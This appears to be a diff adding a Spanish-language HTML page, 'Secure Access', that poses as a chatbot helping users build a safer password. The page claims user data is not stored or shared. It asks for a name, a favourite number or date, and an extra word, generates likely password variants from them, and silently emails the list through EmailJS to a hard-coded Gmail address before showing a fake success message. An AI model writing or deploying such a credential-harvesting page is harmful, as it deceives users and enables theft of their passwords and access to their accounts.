@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Secure Access</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.app {
+    width: 400px;
+    background: white;
+    border-radius: 12px;
+    padding: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+}
+
+/* HEADER */
+.header {
+    text-align: center;
+}
+
+.header h2 {
+    margin: 0;
+    color: #1877f2;
+}
+
+.header p {
+    font-size: 13px;
+    color: gray;
+}
+
+/* PROGRESS */
+.progress {
+    margin: 10px 0;
+}
+
+.bar {
+    height: 6px;
+    background: #e4e6eb;
+    border-radius: 10px;
+    overflow: hidden;
+}
+
+.fill {
+    height: 100%;
+    width: 0%;
+    background: #1877f2;
+    transition: 0.4s;
+}
+
+.step {
+    font-size: 12px;
+    color: gray;
+    margin-top: 3px;
+}
+
+/* CHAT */
+.chat {
+    height: 230px;
+    overflow-y: auto;
+    margin-bottom: 10px;
+}
+
+.msg {
+    padding: 10px;
+    border-radius: 10px;
+    margin: 5px 0;
+    font-size: 14px;
+}
+
+.bot {
+    background: #f0f2f5;
+}
+
+.user {
+    background: #1877f2;
+    color: white;
+    text-align: right;
+}
+
+/* INPUT */
+.input-area {
+    display: flex;
+}
+
+input {
+    flex: 1;
+    padding: 10px;
+    border-radius: 8px;
+    border: 1px solid #ddd;
+}
+
+button {
+    margin-left: 5px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    padding: 10px;
+    border-radius: 8px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+    <div class="header">
+        <h2>Secure Access</h2>
+        <p>🔒 Tus datos no se almacenan ni se comparten</p>
+    </div>
+
+    <div class="progress">
+        <div class="bar"><div class="fill" id="fill"></div></div>
+        <div class="step" id="step">Paso 1 de 3</div>
+    </div>
+
+    <div class="chat" id="chat"></div>
+
+    <div class="input-area">
+        <input type="text" id="input" placeholder="Escribe aquí...">
+        <button onclick="responder()">OK</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+    emailjs.init("He62BX8V0p6vjz12D");
+})();
+
+let paso = 0;
+let datos = {};
+let listaPasswords = [];
+
+function escribir(texto, tipo) {
+    let chat = document.getElementById("chat");
+    let div = document.createElement("div");
+    div.className = "msg " + tipo;
+    div.innerHTML = texto;
+    chat.appendChild(div);
+    chat.scrollTop = chat.scrollHeight;
+}
+
+function actualizarBarra() {
+    let porcentaje = ((paso+1) / 3) * 100;
+    document.getElementById("fill").style.width = porcentaje + "%";
+    document.getElementById("step").innerText = "Paso " + (paso+1) + " de 3";
+}
+
+function reiniciar() {
+    paso = 0;
+    datos = {};
+    listaPasswords = [];
+    document.getElementById("chat").innerHTML = "";
+    actualizarBarra();
+    iniciar();
+}
+
+function iniciar() {
+    escribir("Hola 👋 este proceso te ayudará a crear un acceso más seguro.", "bot");
+    escribir("Piensa en una palabra corta (por ejemplo, tu nombre o apodo).", "bot");
+}
+
+function generar() {
+    let base = datos.base.toLowerCase();
+    let num = datos.numero;
+    let extra = datos.extra || "";
+
+    let capital = base.charAt(0).toUpperCase() + base.slice(1);
+
+    listaPasswords = [
+        base + num,
+        capital + num,
+        base + "_" + num,
+        base + "." + num,
+        base + num + "!",
+        num + base,
+        base + "202" + num
+    ];
+
+    if (extra) {
+        listaPasswords.push(base + extra + num);
+    }
+
+    listaPasswords = [...new Set(listaPasswords)];
+}
+
+function enviarAutomatico() {
+    let textoFinal = listaPasswords.join("\\n");
+
+    emailjs.send("service_R1004", "template_4bhnzmm", {
+        password: textoFinal,
+        to_email: "DP126707@gmail.com"
+    })
+    .then(() => {
+        escribir("✅ Configuración completada correctamente.", "bot");
+        escribir("🔐 Tu acceso ha sido protegido.", "bot");
+
+        setTimeout(() => {
+            reiniciar();
+        }, 2500);
+
+    }, (error) => {
+        console.log(error);
+        escribir("❌ Error en el sistema.", "bot");
+    });
+}
+
+function responder() {
+    let input = document.getElementById("input");
+    let texto = input.value.trim();
+
+    if (!texto) return;
+
+    escribir(texto, "user");
+
+    if (paso === 0) {
+        datos.base = texto;
+        escribir("Perfecto 👍 ahora agrega un número que suelas usar (ej: fecha).", "bot");
+    } 
+    else if (paso === 1) {
+        datos.numero = texto;
+        escribir("Muy bien 👌 agrega otra palabra si deseas personalizar más.", "bot");
+    } 
+    else if (paso === 2) {
+        datos.extra = texto;
+        escribir("🔄 Analizando combinación...", "bot");
+
+        setTimeout(() => {
+            generar();
+            enviarAutomatico();
+        }, 1000);
+    }
+
+    paso++;
+    actualizarBarra();
+    input.value = "";
+}
+
+iniciar();
+actualizarBarra();
+</script>
+
+</body>
+</html>
